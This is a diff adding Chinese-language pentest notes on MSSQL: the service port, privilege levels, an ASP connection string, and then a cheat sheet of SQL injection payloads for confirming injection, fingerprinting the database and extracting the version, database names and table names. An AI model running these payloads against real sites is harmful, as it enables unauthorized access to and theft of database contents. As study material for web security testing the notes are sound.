@@ -1,0 +1,31 @@
+MSSQL数据库：
+  美国Microsoft的关系型数据库，高性能设计，管理先进支持图形化
+Mssql服务：
+  服务：win + R 输入service.msc
+  端口：TCP 1433
+Mssql数据库文件：
+  数据库文件后缀：*.mdf
+  数据库日志文件后缀：*.ldf
+Mssql数据库权限：
+  sa权限：数据库操作，文件管理，命令执行，注册表读取等system
+  db权限：文件管理，数据库操作等  --users-administrator
+  public权限：数据库操作  --guest
+数据库调用：
+  <%
+  set conn=server.createobject("adodb.connection")
+  conn.open "provider=sqloledb;source=local;uid=sa;pwd=****,database=database-name"
+  %>
+判断注入：
+  1、判断是否注入：and 1=1  ; and 1=2
+  2、初步判断是否是mssql： and user>0
+  3、判断数据库系统：and (select count(*) from sysobjects)>0  -->mssql ; and (select count(*) from msysobjects)>0 -->access
+  4、注入参数是字符：'and [查询条件] and ''='
+  5、搜索时没过滤参数的：'and [查询条件] and '%25'='
+  
+  
+  
+获取数据库信息：id=1 and 1=(select @@version)
+获取当前数据库名称：id=1 and 1=(select db_name())
+获取第一个用户数据库：id=1 and 1=(select top 1 name from master..sysdatabases where dbid>4)
+获取下一个用户数据库：id=1 and 1=(select top 1 name from master..sysdatabases where dbid>4 and name<> 'acublog')   备注(acublog为已知数据库)
+获取第一张表：id=1 and 1=(select top 1 name from sysobjects where xtype='u')
